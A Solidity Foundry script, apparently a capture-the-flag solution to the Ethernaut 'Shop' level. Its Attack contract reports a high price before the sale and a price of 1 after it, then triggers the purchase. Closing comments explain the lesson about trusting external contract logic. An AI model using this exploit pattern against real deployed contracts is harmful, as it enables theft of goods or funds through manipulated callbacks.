// // SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Shop, Buyer} from "../src/Shop.sol";
import "@forge-std/Script.sol";

contract Attack is Buyer {
    Shop public shop;

    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 1: 1000;
    }

    function pwn() public {
        shop.buy();
    }
}

contract ShopScript is Script {
    Shop public shopContract;

    function setUp() public {
        shopContract = Shop(payable(vm.envAddress("SHOP_CONTRACT")));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack(address(shopContract));
        attack.pwn();
        vm.stopBroadcast();
    }
}

//Contracts can manipulate data seen by other contracts in any way they want.

// It's unsafe to change the state based on external and untrusted contracts logic.